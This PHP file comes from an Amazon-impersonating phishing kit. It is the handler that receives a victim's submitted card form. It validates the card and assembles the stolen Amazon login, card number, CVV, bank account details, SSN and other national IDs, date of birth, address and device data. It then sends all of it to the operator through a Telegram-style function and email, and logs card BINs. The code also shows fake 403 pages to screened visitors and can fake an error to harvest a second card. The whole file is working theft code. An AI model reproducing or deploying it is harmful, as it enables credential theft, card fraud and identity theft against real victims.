<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once("../blocker3.php");
require_once('../session.php');
$ip = getUserIP();
$randomnumber = rand(1, 100);
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
if($_POST['ccno'] == "") {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$valid = validatecard($_POST['ccno']);
if($valid == false) {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_tahun'] < 19) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_bulan'] > 12) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$antidouble = md5($_POST['ccno']);
$_SESSION['ending'] = substr($_POST['ccno'], -4);
$bin = check_bin($_POST['ccno']);
$ispuser = getisp($ip);
$phone = check_carrier($_SESSION['phone']);
$message = "
------------------------[ AMAZON ACCOUNT ]-----------------
Email          : ".$_SESSION['email']."
Password       : ".$_SESSION['password']."
------------------------[ CREDIT CARD ]--------------------
Bank           : ".$bin["bank"]["name"]."
Type           : ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."
Level          : ".strtoupper($bin["brand"])."
Card Holder    : ".post('ccname')."
Card Number    : ".post('ccno')."
Expired        : ".post('expm')."/".post('expy')."
CVV            : ".post('cvv')."
Amex CID       : ".post('cid')."
Account Number : ".post('acno')."
Sort Code      : ".post('sortcode')."
Credit Limit   : ".post('climit')."
For Check      : ".post('ccno')."|".post('expm')."|".post('expy')."|".post('cvv')."
------------------------[ JAPAN INFO ]---------------------
Card Password  : ".post('passjp')."
WEB ID         : ".post('cardid')."
------------------------[ BILLING INFO ]-------------------
Full Name      : ".post('fullname')."
Address 1      : ".post('address1')."
Address 2      : ".post('address2')."
City           : ".post('city')."
State          : ".post('state')."
Zip            : ".post('zipcode')."
Country        : ".post('country')."
DOB            : ".post('dob')."
Phone Number   : ".post('phone')."
------------------------[ OTHER INFO ]---------------------
ID Number      : ".post('numbid')." (GR,HK)
Civil ID       : ".post('civilid')." (KW)
Qatar ID       : ".post('qatarid')." (QA)
National ID    : ".post('naid')." (SA)
Citizen ID     : ".post('naid')." (TH)
Passport Number: ".post('passport')." (CY)
SIN            : ".post('sin')." (CA)
SSN            : ".post('ssn')." (US)
OSID Number    : ".post('osidnumber')." (AU)
------------------------[ Device Info ]--------------------
IP             : ".$ip."
ISP            : ".$ispuser."
Region         : ".$regioncity."
City           : ".$citykota."
Continent      : ".$continent."
Time Zone      : ".$timezone."
OS / Browser   : ".$os." / ".$br."
Date           : ".$date."
User Agent     : ".$user_agent."";

  tele_res($message);
    
    tulis_file("../result/total_cc.txt", $ip);
    tulis_file("../result/total_bin.txt","$subbin\n");
$_SESSION['emailBill'] = $_SESSION['email'];
$akun = $_SESSION['emailBill'];
$bins = preg_replace('/\s/', '', $_POST['ccno']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_POST['ccname'];
$to = $config['email_result'];
$from = $_POST['ccname'];
if($config['get_billing'] == "on") {
	$from = $_SESSION['fullname'];
}else{
	$from = $_POST['ccname'];
}
if($bin["brand"] == "") {
        $subject = "Result [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." # $cn - $ip - $br";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
    $subject = "Result [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." # $cn - $ip - $br";
    $subbin = "Result [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
if ($antidouble == $_SESSION['anti_double']) {
} else {
    kirim_mail($to,$from,$subject,$message,$headers);
}
$_SESSION['anti_double'] = md5($_POST['ccno']);

if ($_SESSION['cc_pertama'] == "udah") {
} else {
    if($config['double_cc'] == "on") {
        $_SESSION['cc_pertama'] = "udah";
            echo "<script type='text/javascript'>window.top.location='../ap/payment?session=$key&error=1';</script>";
    }
}
if ($config['get_bank'] == "on") {
    echo "<script type='text/javascript'>window.top.location='../ap/bank?session=$key';</script>";
    exit();
} else {
    if ($config['get_photo'] == "on") {
        echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
        exit();
    }else{
        echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
        exit();
    }
}
?>
